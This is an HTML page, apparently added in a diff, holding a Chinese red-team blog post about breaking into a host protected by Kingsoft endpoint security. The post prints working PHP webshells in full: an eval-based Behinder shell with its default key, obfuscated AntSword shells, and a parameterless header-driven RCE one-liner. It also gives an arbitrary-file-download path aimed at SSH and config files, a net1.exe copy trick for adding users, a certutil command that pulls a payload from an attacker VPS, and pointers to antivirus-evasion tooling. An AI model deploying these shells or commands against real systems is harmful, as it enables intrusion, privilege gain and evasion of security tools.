@@ -1,0 +1,470 @@
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<title>浅谈bypass金山终端安全系统的心路历程 - 毅种循环的洗剑录</title>
+<link rel="shortcut icon" href="https://redteamblog.icu/favicon.ico">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.2.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css">
+<link rel="stylesheet" href="https://redteamblog.icu/media/css/tailwind.css">
+<link rel="stylesheet" href="https://redteamblog.icu/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="浅谈bypass金山终端安全系统的心路历程 - 毅种循环的洗剑录 - Atom Feed" href="https://redteamblog.icu/atom.xml">
+
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-G-3LVTE3TBXM"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+  
+    gtag('config', 'UA-G-3LVTE3TBXM');
+  </script>
+    
+
+  <meta name="description" content="浅谈bypass金山终端安全系统的心路历程
+1.漏洞详情
+任意文件下载
+
+/htmltopdf/downfile.php?filename=xxx
+
+/conf
+/.ssh
+.....
+
+任意文件上传
+
+2.getshell
+遇到几个问题
+..." />
+  <meta property="og:title" content="浅谈bypass金山终端安全系统的心路历程 - 毅种循环的洗剑录">
+  <meta property="og:description" content="浅谈bypass金山终端安全系统的心路历程
+1.漏洞详情
+任意文件下载
+
+/htmltopdf/downfile.php?filename=xxx
+
+/conf
+/.ssh
+.....
+
+任意文件上传
+
+2.getshell
+遇到几个问题
+..." />
+  <meta property="og:type" content="articles">
+  <meta property="og:url" content="https://redteamblog.icu/post/qian-tan-bypass-jin-shan-zhong-duan-an-quan-xi-tong-de-xin-lu-li-cheng/" />
+  <meta property="og:image" content="https://www.notion.so/image/https%3A%2F%2Fwww.notion.so%2Fimages%2Fpage-cover%2Frijksmuseum_jansz_1636.jpg?width=400&amp;userId=364a146f-a121-4cde-b266-ff8866fbcddf&amp;cache=v2">
+  <meta property="og:image:height" content="630">
+  <meta property="og:image:width" content="1200">
+  <meta name="twitter:title" content="浅谈bypass金山终端安全系统的心路历程 - 毅种循环的洗剑录">
+  <meta name="twitter:description" content="浅谈bypass金山终端安全系统的心路历程
+1.漏洞详情
+任意文件下载
+
+/htmltopdf/downfile.php?filename=xxx
+
+/conf
+/.ssh
+.....
+
+任意文件上传
+
+2.getshell
+遇到几个问题
+...">
+  <meta name="twitter:card" content="summary_large_image">
+  <link rel="canonical" href="https://redteamblog.icu/post/qian-tan-bypass-jin-shan-zhong-duan-an-quan-xi-tong-de-xin-lu-li-cheng/">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css">
+ 
+  
+    <link rel="stylesheet" href="https://redteamblog.icu/media/css/prism-atom-dark.css">
+  
+
+  
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+  
+</head>
+
+<body>
+  <div class="antialiased flex flex-col min-h-screen" id="app">
+    <a href="https://redteamblog.icu" class="fixed top-0 left-0 mt-4 bg-black text-white dark:text-gray-700 dark:bg-yellow-50 dark:hover:bg-black dark:hover:text-white inline-flex p-2 pl-8 hover:text-gray-700 hover:bg-yellow-50 font-bold z-10 transition-fast animated fadeInLeft">
+      毅种循环的洗剑录
+    </a>
+    <div class="max-w-4xl w-full mx-auto">
+      <div class="shadow-box bg-white dark:bg-gray-600 rounded-lg pt-32 md:pt-64 px-4 md:px-8 pb-8 animated fadeIn mb-8">
+        <h1 class="text-5xl font-semibold leading-normal pb-8 mb-8 border-b-8 border-gray-700">
+          浅谈bypass金山终端安全系统的心路历程
+        </h1>
+        
+          <img src="https://www.notion.so/image/https%3A%2F%2Fwww.notion.so%2Fimages%2Fpage-cover%2Frijksmuseum_jansz_1636.jpg?width=400&amp;userId=364a146f-a121-4cde-b266-ff8866fbcddf&amp;cache=v2" alt="浅谈bypass金山终端安全系统的心路历程" class="block w-full mb-8">
+        
+        <div class="mb-8 flex flex-wrap">
+          <div class="text-gray-400 text-sm mr-4">2022-04-23 · 6 min read</div>
+          
+            <a href="https://redteamblog.icu/tag/-uEIOBB-D/" class="text-gray-700 text-sm border-b-2 border-dotted border-gray-200 hover:border-gray-600 transition-all duration-100 inline-flex mr-2">
+              <i class="ri-hashtag"></i>
+              渗透测试
+            </a>
+          
+        </div>
+        <div class="markdown mb-8" v-pre>
+          <h3 id="浅谈bypass金山终端安全系统的心路历程"><strong>浅谈bypass金山终端安全系统的心路历程</strong></h3>
+<h3 id="1漏洞详情"><strong>1.漏洞详情</strong></h3>
+<p>任意文件下载</p>
+<figure data-type="image" tabindex="1"><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0659a55f-3767-496c-b4c5-5f8a046047ca/image-20220105185324607.png" alt="image-20220105185324607.png" loading="lazy"></figure>
+<pre><code>/htmltopdf/downfile.php?filename=xxx
+
+/conf
+/.ssh
+.....
+</code></pre>
+<p>任意文件上传</p>
+<figure data-type="image" tabindex="2"><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8a7e1147-a7e1-4348-9af7-abc841190795/image-20220105185415675.png" alt="image-20220105185415675.png" loading="lazy"></figure>
+<h3 id="2getshell"><strong>2.getshell</strong></h3>
+<p>遇到几个问题</p>
+<p>1.上传任意文件被秒删，只能存活一秒。</p>
+<p>2.php的 <code>eval、create_function、base64_decode</code> 等敏感函数被杀，以及函数不能传递任何参数，但system等命令执行函数能执行。</p>
+<p>3.无法执行敏感命令操作，比如 <code>net user /add</code> ，ps反弹cs等。</p>
+<p>对于第一个问题，虽然只能存活一秒，但是能执行成功，我们可以往其他目录写shell。比如</p>
+<pre><code class="language-php">&lt;?php file_put_contents(&quot;../../xx.php&quot;,'xxxx');
+</code></pre>
+<p>这样可以解决第一个问题，我们可以写shell到其他目录来bypass。</p>
+<p>第二个问题，<code>eval</code> 函数被禁用，不能传递参数，需要传递参数的shell均无法执行。比如冰蝎</p>
+<pre><code class="language-php">&lt;?php
+@error_reporting(0);
+session_start();
+    $key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
+    $_SESSION['k']=$key;
+    session_write_close();
+    $post=file_get_contents(&quot;php://input&quot;);
+    if(!extension_loaded('openssl'))
+    {
+        $t=&quot;base64_&quot;.&quot;decode&quot;;
+        $post=$t($post.&quot;&quot;);
+
+        for($i=0;$i&lt;strlen($post);$i++) {
+                 $post[$i] = $post[$i]^$key[$i+1&amp;15];
+                }
+    }
+    else
+    {
+        $post=openssl_decrypt($post, &quot;AES128&quot;, $key);
+    }
+    $arr=explode('|',$post);
+    $func=$arr[0];
+    $params=$arr[1];
+    class C{public function __invoke($p) {eval($p.&quot;&quot;);}}
+    @call_user_func(new C(),$params);
+?&gt;
+</code></pre>
+<p>简单观察一下冰蝎的马，首先是有post传参，然后是 <code>eval</code> 函数，所以pass了。然后我们先观察蚁剑的插件生成的免杀马</p>
+<pre><code class="language-php">&lt;?php
+class JADE {
+    function aoMy() {
+        $mmaQ = &quot;\x29&quot; ^ &quot;\x48&quot;;
+        $kndi = &quot;\xda&quot; ^ &quot;\xa9&quot;;
+        $yRpX = &quot;\xb7&quot; ^ &quot;\xc4&quot;;
+        $tHGH = &quot;\x1f&quot; ^ &quot;\x7a&quot;;
+        $EBzf = &quot;\x35&quot; ^ &quot;\x47&quot;;
+        $WFrO = &quot;\x4b&quot; ^ &quot;\x3f&quot;;
+        $iGgJ =$mmaQ.$kndi.$yRpX.$tHGH.$EBzf.$WFrO;
+        return $iGgJ;
+    }
+    function __destruct(){
+        $KUht=$this-&gt;aoMy();
+        @$KUht($this-&gt;rx);
+    }
+}
+$jade = new JADE();
+@$jade-&gt;rx = isset($_GET['id'])?base64_decode($_POST['qwq']):$_POST['qwq'];
+?&gt;
+</code></pre>
+<p>特征很明显。再来看看蚁剑自带的。</p>
+<pre><code class="language-php">&lt;?php
+    $YCgX=create_function(chr(7560/210).chr(645-530).chr(01674-01515).base64_decode('bQ==').str_rot13('r'),chr(0265370/01630).chr(0324020/01630).str_rot13('n').str_rot13('y').str_rot13('(').str_rot13('$').chr(0252733/01371).chr(01275-01116).str_rot13('z').chr(204-103).base64_decode('KQ==').chr(21948/372));
+$YCgX(base64_decode('OTE3M'.'DMwO0'.'BldkF'.'sKCRf'.''.str_rot13('H').base64_decode('RQ==').chr(225-168).chr(01154-01030).chr(0160150/01234).''.''.chr(25410/363).chr(384-268).str_rot13('0').base64_decode('Wg==').base64_decode('WA==').''.'N0XSk'.'7Mjc1'.'MTA5M'.'Ds='.''));?&gt;
+</code></pre>
+<p>通过<code>str_rot13</code>和<code>base64</code>相关的字符串处理函数来进行bypass，但是明显有create_function函数在，也被过滤了，后面猜想企业终端云防护应该收录了这种公开的shell，常规bypass应该绕不过。</p>
+<p>经过n多种尝试，发现并不能达成直接连上冰蝎或者蚁剑的要求，转换思路尝试写个没有参数传递的能执行命令的伪shell</p>
+<p><strong>php无参数rce</strong>，ctf多年前的考点，比如。</p>
+<pre><code class="language-php">&lt;?=system(end(getallheaders()));
+</code></pre>
+<p>当时时间紧迫，只是临时构造了个demo，关于无参数rce还有很多形式的方法。</p>
+<h3 id="3获取权限"><strong>3.获取权限</strong></h3>
+<p>第二个问题解决了。来到了第三个问题，如何进一步获取主机权限？首先尝试了各种方法。比如</p>
+<p>1.远程ps上线（毫无意外的被拦截，应该是云防护拦截的</p>
+<p>2.通过<code>net user /add</code>操作添加用户然后3389连，当然这儿已经在内网了，所以可以直接连接。(被拦)</p>
+<p>也尝试利用<code>C:\Windows\System32\net1.exe</code>来进行添加，或者通过<code>COPY</code>命令复制<code>net1.exe</code>来绕过防护，比如</p>
+<pre><code class="language-powershell">COPY C:\Windows\System32\net1.exe C:\Users\Public\test
+start test user xxx /add
+</code></pre>
+<p>很遗憾被拦截了。</p>
+<p>最后经过ping探测，发现出网，决定利用<code>certutil</code>来实现远程下载。比如</p>
+<pre><code class="language-bash">certutil -urlcache -split -f http://vps/xxx xxx
+</code></pre>
+<p>简单服务器起个<code>http</code>服务之后发现可以下载。不过当下载<code>exe</code>的时候发现被拦截了。直接改成其他后缀绕过。</p>
+<p>后面思路就很明显了，远程下载exe然后直接上线。然后又被拦截了，想着难道还要我做免杀？</p>
+<p>当时已经深夜了，做免杀未免太耗时间，想着添加个管理员用户直接3389连。但是前面的net命令又被禁用了。又来到了熟悉的bypass环节。</p>
+<p><strong>使用windows api添加用户</strong></p>
+<p>这个方法在去年hw被大家广泛使用。贴个github项目</p>
+<pre><code class="language-powershell">https://github.com/lengjibo/NetUser
+</code></pre>
+<p>原理在这不做过多阐述，大概就是利用windows自带的接口进行相关操作。最后结果图</p>
+<figure data-type="image" tabindex="3"><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1e72434e-7a22-44d7-8b25-4880d8ceeefb/image-20220105213723112.png" alt="image-20220105213723112.png" loading="lazy"></figure>
+<h3 id="4常见的shellcode免杀"><strong>4.常见的shellcode免杀</strong></h3>
+<p>对于一个web手来说，让我们手写shellcode来bypass杀软有点过分，所以或多或少需要借助已有轮子，这里推荐大家用go来生成相关的木马。</p>
+<p>对于go生成的木马特征不是很明显，不过还是容易被识别出来，所以我们需要借助混淆、清除特征来进行隐藏。</p>
+<p>对于已有的轮子推荐</p>
+<p>go-strip：用来清除go编译的特征以及函数名混淆（当然，go编译的参数也可以进行初步特征清除</p>
+<p>garble：很多人使用（在go编译的时候就会进行字节码、函数相关的混淆，过火绒应该还是没问题</p>
+<p><strong>web手的进一步免杀工程</strong></p>
+<p>通过研究已有项目进行免杀</p>
+<pre><code>https://github.com/safe6Sec/GolangBypassAV
+</code></pre>
+<p>常见的是静态免杀，比如隐藏图片，分离，核心都一样，隐藏特征</p>
+
+        </div>
+        <!-- Share to Twitter, Weibo, Telegram -->
+        <div class="flex items-center">
+          <div class="mr-4 flex items-center">
+            <i class="ri-share-forward-line text-gray-500"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-blue-500 hover:bg-blue-100 dark:hover:bg-gray-600 inline-flex" @click="shareToTwitter">
+            <i class="ri-twitter-line"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-red-500 hover:bg-red-100 dark:hover:bg-gray-600 inline-flex" @click="shareToWeibo">
+            <i class="ri-weibo-line"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-indigo-500 hover:bg-indigo-100 dark:hover:bg-gray-600 inline-flex" @click="shareToTelegram">
+            <i class="ri-telegram-line"></i>
+          </div>
+        </div>
+      </div>
+
+      
+
+      
+        <div id="vlaine-comment"></div>
+      
+
+      <footer class="py-12 text-center px-4 md:px-0" v-pre>
+  <div>
+	<a href="https://redteamblog.icu"> © 洗剑录</a>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</footer>
+    </div>
+
+    <!-- TOC Container -->
+    <div class="fixed right-0 bottom-0 mb-16 mr-4 shadow w-8 h-8 rounded-full flex justify-center items-center z-10 cursor-pointer bg-white dark:bg-gray-500 dark:text-gray-200 hover:shadow-lg transition-all animated fadeInRight" @click="showToc = true">
+      <i class="ri-file-list-line"></i>
+    </div>
+
+    <div class="fixed right-0 top-0 bottom-0 overflow-y-auto w-64 bg-white dark:bg-gray-800 p-4 border-l border-gray-100 dark:border-gray-600 z-10 transition-fast" :class="{ '-mr-64': !showToc }">
+      <div class="flex mb-4 justify-end">
+        <div class="w-8 h-8 inline-flex justify-center items-center rounded-full cursor-pointer hover:bg-gray-200 dark:hover:bg-gray-600 transition-fast" @click="showToc = false">
+          <i class="ri-close-line text-lg"></i>
+        </div>
+      </div>
+      <div class="post-toc-container">
+        <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#%E6%B5%85%E8%B0%88bypass%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B"><strong>浅谈bypass金山终端安全系统的心路历程</strong></a></li>
+<li><a href="#1%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85"><strong>1.漏洞详情</strong></a></li>
+<li><a href="#2getshell"><strong>2.getshell</strong></a></li>
+<li><a href="#3%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90"><strong>3.获取权限</strong></a></li>
+<li><a href="#4%E5%B8%B8%E8%A7%81%E7%9A%84shellcode%E5%85%8D%E6%9D%80"><strong>4.常见的shellcode免杀</strong></a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+      </div>
+    </div>
+
+    <!-- Back to top -->
+    <div class="fixed right-0 bottom-0 mb-4 mr-4 shadow w-8 h-8 rounded-full flex justify-center items-center z-10 cursor-pointer bg-white hover:shadow-lg transition-all dark:bg-gray-500 dark:text-gray-200" @click="backToUp" v-show="scrolled">
+      <i class="ri-arrow-up-line"></i>
+    </div>
+  </div>
+
+  <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+  <!-- Background of PhotoSwipe. 
+        It's a separate element as animating opacity is faster than rgba(). -->
+  <div class="pswp__bg">
+  </div>
+  <!-- Slides wrapper with overflow:hidden. -->
+  <div class="pswp__scroll-wrap">
+    <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+    <div class="pswp__container">
+      <div class="pswp__item">
+      </div>
+      <div class="pswp__item">
+      </div>
+      <div class="pswp__item">
+      </div>
+    </div>
+    <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+    <div class="pswp__ui pswp__ui--hidden">
+      <div class="pswp__top-bar">
+        <!--  Controls are self-explanatory. Order can be changed. -->
+        <div class="pswp__counter">
+        </div>
+        <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+        <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+        <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+        <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+        <!-- element will get class pswp__preloader--active when preloader is running -->
+        <div class="pswp__preloader">
+          <div class="pswp__preloader__icn">
+            <div class="pswp__preloader__cut">
+              <div class="pswp__preloader__donut">
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+        <div class="pswp__share-tooltip">
+        </div>
+      </div>
+      <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+      </button>
+      <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+      </button>
+      <div class="pswp__caption">
+        <div class="pswp__caption__center">
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+  <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+  <script src="https://redteamblog.icu/media/scripts/main.js"></script>
+  
+  <!-- Code Highlight -->
+  
+    <script src="https://redteamblog.icu/media/prism.js"></script>
+    <script>
+      Prism.highlightAll()
+    </script>
+  
+
+  <script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+  <script>
+    //拿到预览框架，也就是上面的html代码
+    var pswpElement = document.querySelectorAll('.pswp')[0];
+    //定义图片数组变量
+    var imgitems;
+    /**
+    * 用于显示预览界面
+    * @param index 图片数组下标
+    */
+    function viewImg(index) {
+      //其它选项这里不做过多阐述，详情见官网
+      var pswpoptions = {
+        index: parseInt(index, 10), // 开始幻灯片索引。0是第一张幻灯片。必须是整数，而不是字符串。
+        bgOpacity: 0.7, // 背景透明度，0-1
+        maxSpreadZoom: 3, // 缩放级别，不要太大
+      };
+      //初始化并打开PhotoSwipe，pswpElement对应上面预览框架，PhotoSwipeUI_Default为皮肤，imgitems为图片数组，pswpoptions为选项
+      var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, imgitems, pswpoptions);
+      gallery.init()
+    }
+    /**
+    * 用于添加图片点击事件
+    * @param img 图片元素
+    * @param index 所属下标（在imgitems中的位置）
+    */
+    function addImgClick(img, index) {
+      img.onclick = function() {
+        viewImg(index)
+      }
+    }
+    /**
+    * 轮询所有图片，获取src、width、height等数据，加入imgitems，并给图片元素添加事件
+    * 最好在onload中执行该方法，本站因放在最底部，所以直接初始化
+    * 异步加载图片可在图片元素创建完成后调用此方法
+    */
+    function initImg() {
+      //重置图片数组
+      imgitems = [];
+      //查找class:markdown 下的所有img元素并遍历
+      var imgs = document.querySelectorAll('.markdown img');
+      for (var i = 0; i < imgs.length; i++) {
+        var img = imgs[i];
+        //本站相册初始为loading图片，真实图片放在data-src
+        var ds = img.getAttribute("data-src");
+        //创建image对象，用于获取图片宽高
+        var imgtemp = new Image();
+        //判断是否存在data-src
+        if (ds != null && ds.length > 0) {
+          imgtemp.src = ds
+        } else {
+          imgtemp.src = img.src
+        }
+        //判断是否存在缓存
+        if (imgtemp.complete) {
+          var imgobj = {
+            "src": imgtemp.src,
+            "w": imgtemp.width,
+            "h": imgtemp.height,
+          };
+          imgitems[i] = imgobj;
+          addImgClick(img, i);
+        } else {
+          console.log('进来了2')
+          imgtemp.index = i;
+          imgtemp.img = img;
+          imgtemp.onload = function() {
+            var imgobj = {
+              "src": this.src,
+              "w": this.width,
+              "h": this.height,
+            };
+            //不要使用push，因为onload前后顺序会不同
+            imgitems[this.index] = imgobj
+            //添加点击事件
+            addImgClick(this.img, this.index);
+          }
+        }
+      }
+    }
+    //初始化
+    initImg();
+  </script>
+  
+    <script type="application/javascript" src="https://unpkg.com/valine"></script>
+<script type="application/javascript">
+  new Valine({
+    el: '#vlaine-comment',
+    appId: 'rBuhTJFD1a0iuN6i7B12we6S-MdYXbMMI',
+    appKey: 'Van0QLtNwLd2jhs2Ja2FX8aP',
+    pageSize: 10,
+    notify: true,
+    avatar: 'mp',
+    verify: true,
+    placeholder: '来都来了，不妨评论一下',
+    visitor: true,
+    highlight: true,
+    recordIP: true,
+  })
+</script>
+  
+  
+</body>
+
+</html>
